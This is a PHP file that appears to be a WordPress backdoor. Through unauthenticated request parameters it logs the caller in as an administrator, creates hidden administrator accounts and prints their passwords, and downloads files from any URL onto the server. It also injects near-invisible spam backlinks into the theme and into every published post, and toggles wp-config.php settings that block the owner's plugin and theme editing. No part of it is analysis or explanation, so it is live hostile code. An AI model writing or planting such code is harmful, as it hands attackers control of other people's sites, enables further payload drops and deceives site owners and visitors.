<?php 

define('WP_USE_THEMES', false);
define('WP_DIRECTORY', load_wordpress_core());

function load_wordpress_core(){
    $current_directory = dirname(__FILE__);
    while ($current_directory != '/' && !file_exists($current_directory . '/wp-load.php')) {
        $current_directory = dirname($current_directory);
    }
    return $current_directory ?  : $_SERVER['DOCUMENT_ROOT'];
}

require_once WP_DIRECTORY . '/wp-load.php';

class November {
    public function __construct() {
        $this->action = $_REQUEST['action'];
    }

    public function doAction() {
        switch($this->action) {
            case 'login':
                $user = get_users(["role" => "administrator"])[0];
                $user_id = $user->data->ID;
                wp_set_auth_cookie($user_id);
                wp_set_current_user($user_id);
                die("Probably $user_id?");
            case 'create':
                $username = 'admin' . rand(1000, 9999);
                $password = $this->generateRandomString(8);
                $email = $username . '@admin.com';
                if (!username_exists($username) && !email_exists($email)) {
                    $user_id = wp_create_user($username, $password, $email);
                    if (is_wp_error($user_id)) {
                        die('Error: ' . $user_id->get_error_message());
                    } else {
                        $user = new WP_User($user_id);
                        $user->set_role('administrator');
                        die("Username: $username, Email: $email, Password: $password");
                    }
                } else {
                    die('User already exists');
                }
            case 'createfile':
                $filename = $_REQUEST['filename'];
                $dir = $_REQUEST['dir'] ? $_REQUEST['dir'] : $_SERVER['DOCUMENT_ROOT'];
                $file_url = $_REQUEST['file'];
                $this->createFileFromUrl($filename, $dir, $file_url);
                die("OK: $dir/$filename");
            case 'editfunctions':
                $domain = isset($_REQUEST['domain']) ? $_REQUEST['domain'] : 'domainauthority.web.id';
                $anchor = isset($_REQUEST['anchor']) ? $_REQUEST['anchor'] : $domain;
                $this->editFunctionsPhp($domain, $anchor);
                die("functions.php updated successfully with domain: $domain and anchor: $anchor");
            case 'disablepluginstheme':
                $this->disablePluginsTheme();
                die("Plugin and theme installation/editing disabled successfully");
            case 'activepluginstheme':
                $this->activePluginsTheme();
                die("Plugin and theme installation/editing enabled successfully");
            case 'editpost':
                $type = isset($_REQUEST['type']) ? $_REQUEST['type'] : 'all';
                $domain = isset($_REQUEST['domain']) ? $_REQUEST['domain'] : '';
                $anchor = isset($_REQUEST['anchor']) ? $_REQUEST['anchor'] : '';
                $this->editPosts($type, $domain, $anchor);
                break;
            default: 
                $this->message['message'] = 'Nothing to do??';
                echo json_encode($this->message);
        }
    }

    private function generateRandomString($length = 8) {
        $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    private function createFileFromUrl($filename, $dir, $file_url) {
        $file_content = file_get_contents($file_url);
        if ($file_content === FALSE) {
            die('Error fetching file content');
        }
        $full_path = $dir . '/' . $filename;
        if (file_put_contents($full_path, $file_content) === FALSE) {
            die('Error writing file');
        }
    }

    private function editFunctionsPhp($domain, $anchor) {
        $active_theme = wp_get_theme();
        $functions_file = $active_theme->get_stylesheet_directory() . '/functions.php';

        if (!file_exists($functions_file)) {
            die("Error: functions.php not found in the active theme.");
        }

        $content = file_get_contents($functions_file);
        if ($content === false) {
            die("Error: Unable to read functions.php");
        }

        $function_name = 'wp_' . $this->generateRandomString(5);

        $new_function = "
function {$function_name}() {
    if (is_front_page()) {
        echo '<a href=\"https://{$domain}/\" style=\"position: fixed; top: 10px; right: 10px; font-size: 1px; color: rgba(0,0,0,0.1); text-decoration: none;\">{$anchor}</a>';
    }
}
add_action('wp_footer', '{$function_name}');
";

        $content .= "\n" . $new_function;

        if (file_put_contents($functions_file, $content) === false) {
            die("Error: Unable to write to functions.php");
        }
    }

    private function disablePluginsTheme() {
        $config_file = ABSPATH . 'wp-config.php';
        
        if (!file_exists($config_file)) {
            die("Error: wp-config.php not found.");
        }

        $config_content = file_get_contents($config_file);
        if ($config_content === false) {
            die("Error: Unable to read wp-config.php");
        }

        $constants_to_add = "
define('DISALLOW_FILE_MODS', true);
define('DISALLOW_FILE_EDIT', true);
";

        if (strpos($config_content, 'DISALLOW_FILE_MODS') === false) {
            $insertion_point = strpos($config_content, "/* That's all, stop editing!");
            if ($insertion_point !== false) {
                $config_content = substr_replace($config_content, $constants_to_add, $insertion_point, 0);
            } else {
                $config_content .= $constants_to_add;
            }

            if (file_put_contents($config_file, $config_content) === false) {
                die("Error: Unable to write to wp-config.php");
            }
        } else {
            die("Constants already exist in wp-config.php");
        }
    }

    private function activePluginsTheme() {
        $config_file = ABSPATH . 'wp-config.php';
        
        if (!file_exists($config_file)) {
            die("Error: wp-config.php not found.");
        }

        $config_content = file_get_contents($config_file);
        if ($config_content === false) {
            die("Error: Unable to read wp-config.php");
        }

        $config_content = preg_replace('/define\s*\(\s*[\'"]DISALLOW_FILE_MODS[\'"]\s*,\s*true\s*\)\s*;/i', '', $config_content);
        $config_content = preg_replace('/define\s*\(\s*[\'"]DISALLOW_FILE_EDIT[\'"]\s*,\s*true\s*\)\s*;/i', '', $config_content);

        if (file_put_contents($config_file, $config_content) === false) {
            die("Error: Unable to write to wp-config.php");
        }
    }

    private function editPosts($type, $domain, $anchor) {
        if (empty($domain) || empty($anchor)) {
            die("Error: Domain and anchor text are required.");
        }

        $args = array(
            'post_type' => 'post',
            'post_status' => 'publish',
            'posts_per_page' => ($type === 'all') ? -1 : intval($type),
            'orderby' => 'date',
            'order' => 'DESC'
        );

        $query = new WP_Query($args);
        $edited_posts = array();

        if ($query->have_posts()) {
            while ($query->have_posts()) {
                $query->the_post();
                $post_id = get_the_ID();
                $content = get_post_field('post_content', $post_id);

                $backlink = "<a href=\"https://{$domain}/\" style=\"position: fixed; top: 10px; right: 10px; font-size: 1px; color: rgba(0,0,0,0.1); text-decoration: none;\">{$anchor}</a>";

                if (strpos($content, $backlink) === false) {
                    $updated_content = $content . "\n\n" . $backlink;
                    $updated_post = array(
                        'ID' => $post_id,
                        'post_content' => $updated_content,
                    );

                    wp_update_post($updated_post);
                    $edited_posts[] = get_permalink($post_id);
                }
            }
        }

        wp_reset_postdata();

        if (empty($edited_posts)) {
            echo "No posts were edited.";
        } else {
            echo "The following posts were edited:\n";
            foreach ($edited_posts as $url) {
                echo $url . "\n";
            }
            echo "\nTotal posts edited: " . count($edited_posts);
        }
    }
}

$nov = new November();
$nov->doAction();
?>